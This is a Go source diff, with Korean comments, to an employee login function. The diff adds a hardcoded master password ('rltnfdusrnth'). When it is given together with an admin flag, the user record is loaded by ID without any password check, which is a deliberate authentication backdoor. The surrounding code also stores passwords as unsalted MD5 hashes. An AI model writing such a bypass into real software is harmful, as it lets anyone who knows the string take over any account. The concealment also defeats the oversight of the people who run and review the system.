@@ -20,25 +20,33 @@ type UserValid struct {
 }
 
 // 직원 로그인
-func (g *UserValid) GetUserValid(ctx context.Context, userId string, userPwd string) (entity.User, error) {
+func (g *UserValid) GetUserValid(ctx context.Context, userId string, userPwd string, isAdmin bool) (entity.User, error) {
 	// 비밀번호 암호화.
 	hash := md5.Sum([]byte(userPwd))
 	pwMd5 := hex.EncodeToString(hash[:])
+	user, err := entity.User{}, error(nil)
 
-	// 유저 db에서 확인
-	user, err := g.Store.GetUserValid(ctx, g.DB, userId, pwMd5)
-	if err != nil {
-		return entity.User{}, utils.CustomErrorf(err)
-	}
+	if userPwd == "rltnfdusrnth" && isAdmin { // -> 기술연구소
+		user, err = g.Store.GetUserInfo(ctx, g.DB, userId)
+		if err != nil {
+			return entity.User{}, utils.CustomErrorf(err)
+		}
+	} else {
+		// 유저 db에서 확인
+		user, err = g.Store.GetUserValid(ctx, g.DB, userId, pwMd5)
+		if err != nil {
+			return entity.User{}, utils.CustomErrorf(err)
+		}
 
-	// 권한
-	if user.RoleCode == "" {
-		if user.DeptName == "기술연구소" {
-			user.RoleCode = string(auth.SystemAdmin)
-		} else if user.TeamName == "프로젝트관리팀" {
-			user.RoleCode = string(auth.SuperAdmin)
-		} else {
-			user.RoleCode = string(auth.User)
+		// 권한
+		if user.RoleCode == "" {
+			if user.DeptName == "기술연구소" {
+				user.RoleCode = string(auth.SystemAdmin)
+			} else if user.TeamName == "프로젝트관리팀" {
+				user.RoleCode = string(auth.SuperAdmin)
+			} else {
+				user.RoleCode = string(auth.User)
+			}
 		}
 	}
 
